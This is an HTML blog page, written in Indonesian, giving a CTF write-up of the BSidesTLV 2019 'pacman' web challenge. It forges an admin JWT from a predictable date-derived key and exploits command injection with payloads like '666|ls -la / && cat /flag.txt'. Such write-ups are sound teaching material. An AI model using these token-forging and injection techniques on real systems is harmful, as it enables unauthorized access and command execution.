@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- Author : sohai | this code generate by python script -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="An software engineer guy who loves write code and learn about security & reversing">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Hello World">
+    <meta property="og:url" content="https://sohainewbie.github.io">
+    <meta property="og:site_name" content="">
+    <meta property="og:description" content="An software engineer guy who loves write code and learn about security & reversing">
+    <meta property="og:locale" content="en">
+    <meta name="twitter:title" content="Hello World">
+    <meta name="twitter:description" content="An software engineer guy who loves write code and learn about security & reversing">
+    <!-- title -->
+    <title>Hello World</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="assets/css/style.css">
+
+    <style type="text/css">
+        .code-container{
+            background-color: #2f1111;
+            height: 175px;
+            width: 869px;
+            margin-left: 84px;
+        }
+        .code-text{
+            color: #c2af46;
+            margin-left: -68px;
+        }
+    </style>
+</head>
+
+<body>
+  <div >
+    <pre>
+    <span class="style2">  ___ ___                                 .__</span>              
+    <span class="style8"> /   |   \   ____ ___  ___         _______|__| ____   ____ </span> 
+    <span class="style5">/    ~    \_/ __ \\  \/  /  ______ \___   /  |/    \_/ __ \ </span>
+    <span class="style3">\    Y    /\  ___/ >    <  /_____/  /    /|  |   |  \  ___/ </span>
+    <span class="style4"> \___|_  /  \___  >__/\_ \         /_____ \__|___|  /\___  ></span>
+    <span class="style6">       \/       \/      \/               \/       \/     \/ </span>
+    </pre>    
+    <div class="content-article">
+        <pre>
+            pertama kita download dulu file <a href="https://raw.githubusercontent.com/sohainewbie/ctf/master/bsidestlv2019/webapplication/packman/challange.js">challenge.js</a> nya, kemudian kita analisa
+            code nya , oh ya saya mengunakan dynamic analisis
+
+            bisa kita lihat bahwa challange nya mengunakan nodejs, dengan framework expresjs,
+            kemudian kita coba install modules nya kemudian kita jalankan server nya.
+
+            kita buka di browser alamat <span>http://pacman.challenges.bsidestlv.com/</span> maka akan muncul tulisan <span style="color:red;">You are not authorized!</span>
+
+            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/1.png" style="width: 862px;height: 400px;">
+            
+            mari kita check path `/` pada challenge.js
+            <div class="code-container">
+            <pre class="code-text">
+            app.get('/', function(req, res) {
+                if(req.headers['user-agent'] === 'LevelUP!' && decodeValue(req.cookies.auth, generateKey())) {
+                    res.render('game.ejs');
+                } else {
+                    res.send("You are not authorized!");
+                }
+
+            });
+            </pre>
+            </div>
+            sebelum mengakses endpoint tersebut , kita harus mengeset user-agent dan cookies.
+            namun pada cookies ada pemangilan fungsi decodeValue dimana cookies auth akan di decode berdasarkan fungsi  generateKey()
+            maka bila di urutkan hal yang perlu kita siapkan adalah
+
+            1. set user-agent menjadi LevelUP!
+            2. mengetahui output dari generateKey()
+            3. mengecheck cara kerja fungsi decodeValue(token, key)
+
+            step 1 
+            ------
+            pada request http ke path / kita ubah user-agent  menjadi LevelUP!
+
+            step 2
+            ------
+            mari kita check fungsi `generateKey()`
+            <div class="code-container" style="height: 250px;">
+            <pre class="code-text">
+            function generateKey() {
+
+                const date = new Date();
+                const year = date.getFullYear();
+
+                let month = date.getMonth() + 1;
+                month = (month < 10 ? "0" : "") + month;
+
+                let day  = date.getDate();
+                day = (day < 10 ? "0" : "") + day;
+                const key = `${year}:${month}:${day}:LevelUP!`;
+                return crypto.createHash('md5').update(key).digest("hex");
+
+            }
+            </pre>
+            </div>
+
+            bisa kita simpulkan bahwa key yang akan di generate memiliki pola seperti ini 
+            <span>${year}:${month}:${day}:LevelUP!</span> kemudian encode kedalam hex dan terakhir di hash mengunakan md5
+
+
+
+            asumsikan kita mengunakan time request ke server <span>http://pacman.challenges.bsidestlv.com/</span>
+            <span>Tue, 11 Jun 2019 18:53:40 GMT</span> maka menjadi <span>'2019:06:11:LevelUP!'</span> kemudian kita hex dan md5
+            maka ketika fungsi generateKey() di pangil maka kita akan mendapatkan key <span>cf02bbfc843acac6ff595527c855904b</span>
+
+
+            step 3
+            ------
+            kita check fungsi decodeValue(token, key), menerima 2 inputan berupa token dan key
+
+            <div class="code-container" style="height: 220px;">
+            <pre class="code-text">
+            function decodeValue(token, key) {
+                try {
+                    return jwt.verify(token, key, function (err, decoded) {
+                        return decoded.isAdmin
+                    });
+                }
+                catch(err) {
+                    return false;
+                }
+
+            }
+            </pre>
+            </div>
+
+            pada fungsi decodeValue ada proses pengecheckan token, dan terakhir hasil dari decode token akan di return berupa bolean.
+            bisa kita asumsikan token yang di encode berupa
+
+            <span>{ isAdmin : true }</span> , karena pada proses verify, bisa kita lihat hanya mereturn bagian decoded.isAdmin
+
+            dan karena kita tau key yang di gunakan maka , kita bisa mengenerate token tsb.
+
+            dengan membuat script
+
+            <div class="code-container" style="height: 165px;">
+            <pre class="code-text">
+
+            const jwt = require('jsonwebtoken');
+
+            let key = 'cf02bbfc843acac6ff595527c855904b'
+            const token = jwt.sign({ isAdmin: true }, key);
+            console.log(token)
+
+            </pre>
+            </div>
+
+            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/3.png" style="width: 862px;height: 95px;">
+
+            output <span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJpYXQiOjE1NjAyNzkzNzJ9.-laaimCkf8gJnaCO7ztF_YMc0Xlsq3xVU53oN4RuH24</span>
+
+            maka nanti pada cookies kita set <span>auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc0FkbWluIjp0cnVlLCJpYXQiOjE1NjAyNzkzNzJ9.-laaimCkf8gJnaCO7ztF_YMc0Xlsq3xVU53oN4RuH24</span>
+
+            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/4.png" style="width: 862px;height: 400px;">
+
+            muncul sebuah halaman berupa game packman,
+
+            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/5.png" style="width: 862px;height: 400px;">
+
+            kita viewsource 
+
+           <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/6.png" style="width: 862px;height: 400px;">
+
+            maka kita temukan sebuah event handler ketika user mengclick `levelUp` maka ada proses ajax berupa 
+
+            <span>
+            method : POST
+            url : http://pacman.challenges.bsidestlv.com/levelUp
+            parameter : { "level": currentLevel }
+            </span>
+
+            maka kita coba request lagi.
+
+            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/7.png" style="width: 862px;height: 400px;">
+
+
+            output berupa <span>Level up!</span>
+
+            mari kita check path <span>/levelUp</span> pada script <a href="https://raw.githubusercontent.com/sohainewbie/ctf/master/bsidestlv2019/webapplication/packman/challange.js">challenge.js</a>
+
+            <div class="code-container" style="height: 230px;">
+            <pre class="code-text">
+            app.post('/levelUp', function(req, res) {
+                if(req.headers['user-agent'] === 'LevelUP!' && decodeValue(req.cookies.auth, generateKey())) {
+                    const level = req.body.level;
+                    exec('./levelup ' + level, (err, stdout) => {
+                        res.send(stdout)
+                    });
+                } else {
+                    res.send("You are not authorized!");
+                }
+
+            });
+            </pre>
+            </div>
+
+            bisa kita temukan pada route <span>/levelUp</span> menjalankan fungsi <span>exec</span> dan parameter level sebagai parameter ketika menjalankan
+            file <span>./levelup</span>
+
+            maka bisa kita simpulkan kita menemukan bug command injection , si user bisa mengirimkan malicious command, mari kita test.
+
+            <span>{"level":"666|ls -la && pwd && id"}</span>
+
+            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/8.png" style="width: 862px;height: 400px;">
+
+            maka kita hanya mencari flag dimana
+
+            <span>{"level":"666|ls -la / && cat /flag.txt"}</span>
+
+            <img src="http://sohainewbie.github.io/images/bsidestlv2019-packman/9.png" style="width: 862px;height: 400px;">
+
+            setelah itu flag nya adalah <span>BSidesTLV{H1dd3nPacmanLevelUP!}</span>
+
+            Maka bisa kita simpulkan terdapat 2 bug yaitu:
+
+            1. week create secrect key
+            2. command injection
+        </pre>
+    </div>
+  </div>
+
+</br>
+  <footer id="footer">
+    <div class="footer-left">
+      Copyright &copy; 2019 sohainewbie
+    </div>
+  </footer>
+
+</body>
+</html>
